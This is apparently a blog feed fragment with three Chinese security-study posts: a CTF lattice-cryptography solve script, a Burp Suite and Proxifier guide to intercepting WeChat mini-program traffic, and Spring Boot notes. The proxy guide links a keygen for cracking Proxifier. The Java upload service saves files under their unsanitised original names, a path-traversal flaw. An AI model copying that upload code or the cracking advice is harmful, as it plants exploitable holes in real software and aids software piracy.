class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;******&#x27;</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">s = [getPrime(<span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">a = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"></span><br><span class="line">c = (a[<span class="number">0</span>]*s[<span class="number">0</span>]**<span class="number">2</span>*s[<span class="number">1</span>]**<span class="number">2</span> + a[<span class="number">1</span>]*s[<span class="number">0</span>]*s[<span class="number">2</span>]**<span class="number">2</span> + a[<span class="number">2</span>]*s[<span class="number">1</span>]*s[<span class="number">2</span>]) % p</span><br><span class="line"></span><br><span class="line">flag = m*s[<span class="number">0</span>]*s[<span class="number">1</span>]*s[<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;flag = <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;a = <span class="subst">&#123;a&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析构造过程：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202408021535711.png" alt="image-20240802153311466"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">740925064346371394698186587854547113606276228956443989781507592148712696471120454242180757282913190509143771235457885619359315384722931529795071829165028</span></span><br><span class="line">flag = <span class="number">68803130911709451943985629442913968356735244797651554293510331427148284907075221530061581131130283569506280604032687824733336171953927</span></span><br><span class="line">a = [<span class="number">8205051800134728054685810600921116779466017139080528864745521629232854690213051609775306424843961090482436503418278207286549634492623172279113808752825877</span>, <span class="number">7656695314164580223033364292542508972053206838456547579023164583502640699225283686572923544677077467571265812610524520719197913305928971777756847148151453</span>, <span class="number">12016313094941119621096276870216129960285946825332008187797823075795491053640261786033376211694851951499688886358239835607622191418940486434225440651886891</span>]</span><br><span class="line">p = <span class="number">9725369974716521164256395525866212215114818770667579116304398350357785690930260317036889742178436308598088096925530431498664796728861093872628194022265573</span></span><br><span class="line"></span><br><span class="line">inv_a2 = inverse_mod(a[<span class="number">2</span>], p)</span><br><span class="line"></span><br><span class="line">D = diagonal_matrix(ZZ, [<span class="number">2</span>^<span class="number">128</span>, <span class="number">1</span>, <span class="number">2</span>^<span class="number">32</span>, <span class="number">2</span>^<span class="number">64</span>])</span><br><span class="line">L = Matrix(ZZ, [[<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, c*inv_a2 % p],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, a[<span class="number">0</span>]*inv_a2 % p],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, a[<span class="number">1</span>]*inv_a2 % p],</span><br><span class="line">                [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, p]]) * D</span><br><span class="line"></span><br><span class="line">re = L.LLL()[<span class="number">0</span>]</span><br><span class="line">s0s1 = isqrt(<span class="built_in">abs</span>(re[<span class="number">1</span>]))</span><br><span class="line">s1s2 = <span class="built_in">abs</span>(re[<span class="number">3</span>]) &gt;&gt; <span class="number">64</span>  <span class="comment">#对角矩阵的影响</span></span><br><span class="line">s1 = gcd(s0s1, s1s2)</span><br><span class="line"><span class="built_in">print</span>(s1, s0s1, s1s2)</span><br><span class="line">s2 = s1s2 // s1</span><br><span class="line">s0 = s0s1 // s1</span><br><span class="line">m = flag // s0 // s1 // s2</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><hr><p>格密码入门完结撒花 有点感觉了 但是还是得继续练</p><p>2023-08-23——2024-08-02</p>]]></content>
      
      
      <categories>
          
          <category> CTF-Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 格密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【SRC】小程序抓包巨详细配置，一个Burp就够了，但是可以更优雅！</title>
      <link href="/2024/07/21/2024-07-21-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/"/>
      <url>/2024/07/21/2024-07-21-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="小程序抓包配置">小程序抓包配置</h1><h2 id="0x00-前言">0x00 前言</h2><p>其实在PC端抓微信小程序的包，只需要一个<code>BurpSuite</code>就足够了，但是为了避免抓一些没用的包，减少对小程序抓包测试过程中的干扰，我们可以配合使用一个工具<code>proxifier</code>，当然如果你只是想体验一下抓包小程序的过程，不下这个工具也行，本篇文章会介绍直接便捷的使用Burp抓包的过程，第二部分会介绍配合proxifier的使用，也会给出proxifier的安装破解教程</p><p>！！！！！个人超级大避坑点：一定要把burp的证书导入到电脑中！！！</p><h2 id="0x01-直接使用burpsuite抓包">0x01 直接使用BurpSuite抓包</h2><p>首先第一步，一定一定要把burpsuite的证书装在电脑里面，之前在浏览器抓包只导入到浏览器里面了，但是对于微信这种程序，我们需要把证书装在电脑本机</p><p>首先开启burp后，配置一个端口</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111185.png" alt="image-20240721103235045"></p><p>然后去下载证书</p><p>方法就是在浏览器访问http://127.0.0.1:7777</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111186.png" alt="image-20240721104909174"></p><p>下载完直接导入就行</p><p>导入证书的流程</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111187.png" alt="image-20240721103148732"></p><p>可能注意要把证书的后缀der手动改成cer</p><p>登微信 手动设置一下代理</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111188.png" alt="image-20240721105051881"></p><p>但是这样好像没办法抓住，推测原因可能是这个只是让微信走了这个代理，但是小程序是另一个应用程序，所以没法抓</p><p>所以开一下全局本地代理就好了</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111189.png" alt="image-20240721103532763"></p><p>OK 到此成功抓到</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111190.png" alt="image-20240721105435401"></p><h2 id="0x02-配合proxifier">0x02 配合Proxifier</h2><p>上面存在一个明显的弊端，就是本地的所有程序都会走7777端口，会导致抓到一些没用的包干扰自己，所以装一个Proxifier起到优化作用，其作用可以指定一些程序走指定端口，其他走默认</p><p>下载地址：就去官网就行，虽然是30天免费使用，但是可以破解 <a href="https://www.proxifier.com/">https://www.proxifier.com/</a> 直接下那个exe即可</p><p>注册机：<a href="https://github.com/y9nhjy/Proxifier-Keygen?tab=readme-ov-file">https://github.com/y9nhjy/Proxifier-Keygen?tab=readme-ov-file</a> 运行一下python文件 用第一个就行</p><p>打开一个小程序 确定一下程序位置</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111191.png" alt="image-20240721110217600"></p><p>打开文件位置即可</p><p>配置1</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111192.png" alt="image-20240721110325640"></p><p>配置2</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111193.png" alt="image-20240721110520753"></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111194.png" alt="image-20240721110553862"></p><p>最后勾选一下就可以启动了</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111195.png" alt="image-20240721110642094"></p><p>注意这种情况下就不用设置本地代理咯</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111196.png" alt="image-20240721110709576"></p><p>成功抓包</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/202407211111198.png" alt="image-20240721110948231"></p><hr><p>OK兄弟们 上面就是小程序抓包的详细配置过程啦，希望对大家有帮助，祝师傅们在挖洞的路上越来越牛逼</p>]]></content>
      
      
      <categories>
          
          <category> SRC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小程序抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Java安全】基础配置篇-01</title>
      <link href="/2024/07/19/2024-07-19-Java%E5%AE%89%E5%85%A801/"/>
      <url>/2024/07/19/2024-07-19-Java%E5%AE%89%E5%85%A801/</url>
      
        <content type="html"><![CDATA[<h1 id="java安全-01">Java安全-01</h1><h2 id="前置基础">前置基础</h2><p>基于SpringBoot框架展开开发，首先要了解一下整个项目的分层结构</p><p>从上到下：</p><ul><li>客户端界面：表现层 UI层 界面层</li><li>服务层/业务层：直接为客户端提供的服务或功能</li><li>领域层：系统内的领域活动</li><li>DAO层：数据访问对象，通过领域实体对象操作数据库</li></ul><hr><p>实战代码结构：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/d60b16592e4a6be125628a0d788d6eeb.png" alt="image-20240714014715347"></p><p>其实最外层主要分为两块：</p><ul><li>java目录：主要存放Java代码</li><li>resources目录：主要存放静态资源文件，如html、js、css等</li></ul><p>进入到内层：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/f351b583cdcf0a326253a4a5e0a5e98d.png" alt="image-20240714015540046"></p><ul><li>Java下：<ul><li>annotation：放置项目自定义注解</li><li>Controller：存放控制器，接收从前端传来的参数，负责对访问控制进行转发，各类基本参数校验，或者不复用的业务简单处理</li><li>dao层：数据访问层，与数据库进行交互，负责数据库操作，在Mybites框架中存放自定义的Mapper接口</li><li>entity：存放实体类</li><li>interceptor：拦截器</li><li>service：存放服务类，负责业务模块逻辑处理，其中包含两层：一是Service，用来声明接口；二是ServiceImpl，作为实现类实现接口中的方法</li><li>utils：存放工具类</li><li>dto：存放数据传输对象（Data Transfer Object）, 如请求参数和返回结果</li><li>vo：视图对象（View Object）用于封装客户端请求的数据，防止部分数据泄露，保证数据安全</li><li>constant：存放常量</li><li>filter：存放过滤器</li></ul></li><li>resources目录下<ul><li>mapper：存放Mybites的mapper.xml文件</li><li>static：静态资源文件目录（JavaScript、CSS、图片），在这个目录中所有文件可以被直接访问</li><li>template：存放模板文件</li><li>application.properties：Spring Boot默认配置文件</li></ul></li></ul><p><img src="https://img-blog.csdnimg.cn/img_convert/c9c9af7005f02e22f1ff9001de092a49.png" alt="image-20240714105150398"></p><p>这里的API层 就相当于Controller层</p><ul><li>解释一下Controller和Service之间的区别</li></ul><p>Controller层只会从前端接收数据，然后进行数据转发到Service层，不做具体的操作</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cffd1d58e7206b49341bb1291a7fee37.png" alt="image-20240714130114731"></p><p>一些参数的判断验证，在Controller层进行验证，比如想上传文件的话，可以先在Controller层验证文件名后缀</p><hr><h2 id="小demo开发记录">小demo开发记录</h2><h3 id="文件上传">文件上传</h3><p>为了方便整个系统的开发，我们要规范化文件上传的接口，放在Service层中，保证可以在任何界面都可以去调用并进行上传</p><p>首先是Controller层</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.thymeleaf.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.thymeleaf.service.UploadService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.support.RedirectAttributes;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadController</span> &#123;</span><br><span class="line">    <span class="comment">//解释一下自动装配的功能：使得控制器类能够使用服务类的方法而无需手动创建服务类的实例</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UploadService service;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showUploadForm</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;File Upload&lt;/title&gt;&lt;/head&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;body&gt;&lt;h1&gt;Upload a File&lt;/h1&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;form method=\&quot;POST\&quot; enctype=\&quot;multipart/form-data\&quot; action=\&quot;/upload\&quot;&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;input type=\&quot;file\&quot; name=\&quot;file\&quot; /&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;button type=\&quot;submit\&quot;&gt;Upload&lt;/button&gt;&quot;</span></span><br><span class="line">                + <span class="string">&quot;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleFileUpload</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file,</span></span><br><span class="line"><span class="params">                                   RedirectAttributes redirectAttributes)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> service.uploadFile(file);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You successfully uploaded &#x27;&quot;</span> + fileName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Failed to upload &#x27;&quot;</span> + file.getOriginalFilename() + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>路径是<code>/upload</code>  直接访问是get请求 会展示表单</p><p><img src="https://img-blog.csdnimg.cn/img_convert/cb7e973cd4fe06b816a51e3a158329a8.png" alt="image-20240714164942666"></p><p>点击upload上传文件，是post请求 会上传文件</p><p>Service层：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.thymeleaf.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UploadService</span> &#123;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">uploadFile</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体方法实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.thymeleaf.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.thymeleaf.service.UploadService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UploadService</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;file.upload-dir&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String uploadDir;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">uploadFile</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="keyword">if</span>(file.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to upload empty file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">File</span> <span class="variable">dest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadDir + <span class="string">&quot;/&quot;</span> + file.getOriginalFilename());</span><br><span class="line">        file.transferTo(dest); <span class="comment">//将上传的文件保存到指定的目标文件。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> file.getOriginalFilename();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中记得在配置文件中指定一下目录</p><p><img src="https://img-blog.csdnimg.cn/img_convert/2be2ad28272d2250987cb410b75e6680.png" alt="image-20240714165304202"></p><hr><h2 id="课程学习记录">课程学习记录</h2><h2 id="初始配置阶段">初始配置阶段</h2><p>学习守则：学一个东西前，先自己列一个学习路线，有目标有方向一步一步来</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9109be4db186e1143fc5c9ccc1033cdc.png" alt="image-20240714195514823"></p><h3 id="0x00-微服务阶段历史">0x00 微服务阶段历史</h3><p>all in one：所有功能</p><p>微服务架构：把功能进行分区存储，对某个功能</p><p>了解Spring家族：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5955d6b42a7897adccac0189e254f3e4.png" alt="image-20240715135749019"></p><p>Spring Boot：构建一切</p><p>Spring Cloud：协调一切</p><p>Spring Cloud Data Flow：连接一切</p><h3 id="0x01-第一个springboot程序">0x01 第一个SpringBoot程序</h3><p>玩一下，修改banner</p><p><a href="https://www.bootschool.net/ascii-art/search">https://www.bootschool.net/ascii-art/search</a></p><p><img src="https://img-blog.csdnimg.cn/img_convert/db22a74efde56806e220092bce4d05bf.png" alt="image-20240715202451661"></p><p>在source目录下 创建banner.txt文件即可</p><p><img src="https://img-blog.csdnimg.cn/img_convert/838d6d36ff1aa3adcf1276de148c6834.png" alt="image-20240715202521957"></p><p>6 成功了</p><h3 id="0x02-原理初探">0x02 原理初探</h3><p>自动配置：</p><p>pom.xml：</p><ul><li>Spring-boot-dependencies：核心依赖在父工程中</li><li>在引入Springboot依赖 不需要指定版本 因为有些版本仓库</li></ul><p>启动器：</p><ul><li><pre><code class="language-xml">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  starter后面指定场景，上面这个就会棒我们自动导入web环境所有的依赖</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">主程序：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">//@SpringBootApplication ： 解释一下这个注解 这个是标注这个是Springboot的一个应用  如果没有 直接整个崩掉</span><br><span class="line">// 作用就是：启动类下的所有资源被导入 </span><br><span class="line">@SpringBootApplication</span><br><span class="line">public class BeginnerApplication &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //将Springboot启动</span><br><span class="line">        SpringApplication.run(BeginnerApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre></li></ul><p>解释一下其中的注解，点进去读源码</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a94a1b378c2cd4ff9e01bf2559fe2349.png" alt="image-20240715204554680"></p><ul><li>注解</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@SpringBootConfiguration : Springboot的配置</span><br><span class="line">@Configuration:  spring配置类</span><br><span class="line">@Component : 说明这是一个spring的组件</span><br><span class="line"></span><br><span class="line">@EnableAutoConfiguration : 自动配置</span><br><span class="line">@AutoConfigurationPackage : 自动配置包</span><br><span class="line">@Import(&#123;Registrar.class&#125;) : 导入选择器   注册</span><br><span class="line">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span><br></pre></td></tr></table></figure><h3 id="0x03-springboot配置文件">0x03 SpringBoot配置文件</h3><p>一般操作 首先删除自动生成的<code>application.properties</code></p><p>然后新建一个配置文件<code>application.yaml</code> 修改下后缀 名字不需要改变</p><blockquote><p>介绍一下两者的区别：</p><ul><li>application.properties<ul><li>语法结构：key=value</li></ul></li><li>application.yaml<ul><li>语法结构：key: value  （注意这个地方在冒号后面有一个空格）</li></ul></li></ul></blockquote><p>yaml基础语法：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#普通的key-value</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">qinjing</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#对象</span></span><br><span class="line"><span class="attr">student:</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">qinjiang</span></span><br><span class="line"><span class="attr">age:</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#行内写法</span></span><br><span class="line"><span class="attr">student:</span> &#123;<span class="attr">name:</span> <span class="string">qinjiang</span>,<span class="attr">age:</span> <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#数组  两个空格</span></span><br><span class="line"><span class="attr">pets:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">cat</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">dog</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pig</span></span><br><span class="line">   </span><br><span class="line"><span class="attr">pets:</span> [<span class="string">cat</span>, <span class="string">dog</span>, <span class="string">pig</span>]</span><br></pre></td></tr></table></figure><p>之所以使用yaml 是因为可以给实体类赋值</p><h3 id="0x04-给属性赋值的几种方法">0x04 给属性赋值的几种方法</h3><p>首先可以使用注解</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c9d637da4c4b5a7bd6c15df6e545ba7e.png" alt="image-20240717122821132"></p><p>来test里面测试一下</p><p><img src="https://img-blog.csdnimg.cn/img_convert/5c3276ce6bbcafa31954dbe63a9a9c23.png" alt="image-20240717122909837"></p><p>第二种方法：在yaml配置文件中赋值 核心</p><p><img src="https://img-blog.csdnimg.cn/img_convert/86f5fa534e12f5f0281c186d9dd30ca1.png" alt="image-20240717124728668"></p><p>注意之所以能注入成功，还需要设置一些配置</p><p><img src="https://img-blog.csdnimg.cn/img_convert/99084eb25e45686f8c11871d6965160b.png" alt="image-20240717124822562"></p><p>上面爆红 不影响工作  这是去yaml中找person 去注入数据</p><p>可玩性：直接写一些占位符</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a48ff0c2ccf4814c4b3e5720fa2a5d64.png" alt="image-20240717130911915"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/775f6dbdd4c9600d100875fc29e324cd.png" alt="image-20240717131104680"></p><p>表达式</p><p><img src="https://img-blog.csdnimg.cn/img_convert/514840f8dea08c2ab8c3d443e43b628b.png" alt="image-20240717131933152"></p><p>如果前面这个参数存在 则读取参数 否则直接是hello</p><p><img src="https://img-blog.csdnimg.cn/img_convert/0bf721c2e7c5cc9b7df97d8fdade8f64.png" alt="image-20240717132045472"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/101c33e3febce14f59dc975962610f7f.png" alt="image-20240717132034140"></p><p>松散绑定：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9d16f4ae83d71f8c2fafccfbf9e46438.png" alt="image-20240718133015787"></p><p>注意一下就好 以后看yaml文件 如果看到横杠分隔  知道怎么个事就好</p><hr><p>第三种方法 配置properties</p><p><img src="https://img-blog.csdnimg.cn/img_convert/c3cbe6a9d13cd089e796cee07bf57a53.png" alt="image-20240717130601189"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/98a3d2bd6f26200caa34a48eb11ab7e3.png" alt="image-20240717130631007"></p><p>嘿嘿 成功</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9c46c1df4c3e43e77967e61891d0da4e.png" alt="image-20240717130651774"></p><p>properties防止乱码小技巧：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/87d8ea33e9455e68a8c4c9f1c161e3dc.png" alt="image-20240717124658627"></p><h3 id="0x05-jsr303校验">0x05 JSR303校验</h3><p>在字段加一层过滤器验证，保证数据的合法性</p><p>使用方法</p><p><img src="https://img-blog.csdnimg.cn/img_convert/9b67f53e5ff2fed11f961bfa57c2c206.png" alt="image-20240718163345769"></p><p>注意一定要在pom文件中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--验证数据的依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span 